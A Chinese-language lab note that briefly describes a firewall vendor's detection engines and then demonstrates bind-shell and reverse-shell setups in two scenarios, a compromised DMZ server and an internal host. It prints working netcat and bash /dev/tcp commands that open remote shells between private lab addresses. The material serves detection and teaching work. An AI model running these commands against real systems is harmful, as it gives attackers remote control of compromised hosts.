检测产品可能组合特征匹配、沙箱分析和行为分析；下列产品描述是原作者的历史理解，具体功能应以产品文档和实际配置为准。

- NGE：作为NGFW检测引擎，提供IPS、反病毒和URL过滤等内容安全相关的功能

> 例如，可结合已知特征进行检测；不能由此推断产品仅使用一种方法。

- CDE：可提供数据深度分析，暴露威胁的细节，快速检测恶意文件

> 动态分析可以帮助观察可疑文件的行为；具体实现应查阅产品文档。

- AIE：APT威胁检测引擎，针对暴力破解、C\&C、DGA域名和加密威胁流量进行检测

> 行为分析可能辅助识别异常；此处不能确定具体模型。

## 场景一：失陷主机在非军事区

- 公网服务器失陷，攻击者成功入侵后，将bash发布出去，等待控制端来连接

```
nc -lvvp 2019 -t -e /bin/bash
```

![](/notes-assets/d48f1670b1a3ca430828.webp)

- 攻击者控制端（103），主动连接失陷服务器（105）

```
nc 192.168.0.105 2019
```

![](/notes-assets/27960d90c300d47326d5.webp)

这次实验中存在监听端口，但可访问范围与网络策略有关；单次连接也不能证明持久化。

## 场景二：失陷主机在内网

- 攻击者控制端（103）主动监听2019端口，等待失陷主机（105）来舔

```
nc -vlp 2019
```

![](/notes-assets/f30cc0eead4ed4ed2220.webp)

- 失陷主机（105）舔攻击者控制端（103）

```
bash -i >& /dev/tcp/192.168.0.103/2019 0>&1
```

![](/notes-assets/c0fb4c2228dde7ccdb23.webp)

这次实验建立了反向连接；进程退出、网络变化或重启后是否恢复连接，需要另行验证。
